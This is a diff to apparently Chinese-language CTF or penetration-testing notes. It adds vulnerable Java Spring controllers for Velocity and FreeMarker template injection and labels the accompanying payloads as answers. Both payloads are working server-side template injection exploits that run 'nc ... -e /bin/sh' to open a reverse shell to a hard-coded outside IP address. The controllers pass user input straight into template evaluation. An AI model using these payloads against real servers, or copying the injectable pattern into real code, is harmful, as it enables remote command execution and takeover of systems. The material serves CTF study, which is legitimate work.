@@ -3422,7 +3422,34 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --e
 
 ##### poc 举例
 
-`/ssti` 是 Web 路径，`template` 是 GET 参数，根据具体的题目不同更改
+`/ssti` 是 Web 路径，`template` 是 GET 参数，根据具体的题目不同更改。如，原题目的代码是
+
+```java
+package BOOT-INF.classes.com.drunkbaby.ssti2.controller;
+
+import java.io.StringWriter;
+import org.apache.velocity.VelocityContext;
+import org.apache.velocity.app.Velocity;
+import org.apache.velocity.context.Context;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class VelocitySSTI {
+  @GetMapping({"/ssti"})
+  public void velocity(String template) {
+    Velocity.init();
+    VelocityContext context = new VelocityContext();
+    context.put("author", "Elliot A.");
+    context.put("address", "217 E Broadway");
+    context.put("phone", "555-1337");
+    StringWriter swOut = new StringWriter();
+    Velocity.evaluate((Context)context, swOut, "test", template);
+  }
+}
+```
+
+答案：
 
 ```bash
 /ssti?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc 144.34.181.239 10008 -e /bin/sh")
@@ -3434,7 +3461,41 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --e
 
 ##### poc 举例
 
-`/hello` 是 Web 路径，`name` 是 GET 参数，根据具体的题目不同更改
+`/hello` 是 Web 路径，`name` 是 GET 参数，根据具体的题目不同更改。如，原题目的代码是
+
+```java
+package BOOT-INF.classes.com.drunkbaby.ssti.controller;
+
+import freemarker.template.Configuration;
+import freemarker.template.Template;
+import freemarker.template.TemplateException;
+import java.io.IOException;
+import java.io.StringWriter;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class FreeMarkerSSTI {
+  @GetMapping({"/"})
+  public String index() {
+    return "visit <a href='/hello?name=1'>it</a>";
+  }
+  
+  @GetMapping({"/hello"})
+  public String hello(@RequestParam(value = "name", required = false, defaultValue = "Drunkbaby") String name) throws TemplateException, IOException {
+    Configuration configuration = new Configuration();
+    String templateContent = "hello: " + name;
+    Template tpl = new Template(null, templateContent, configuration);
+    StringWriter writer = new StringWriter();
+    tpl.process(null, writer);
+    System.out.println(writer);
+    return writer.toString();
+  }
+}
+```
+
+答案:
 
 ```bash
 /hello?name=<#assign value="freemarker.template.utility.Execute"?new()>${value("nc 144.34.181.239 10008 -e /bin/sh")}
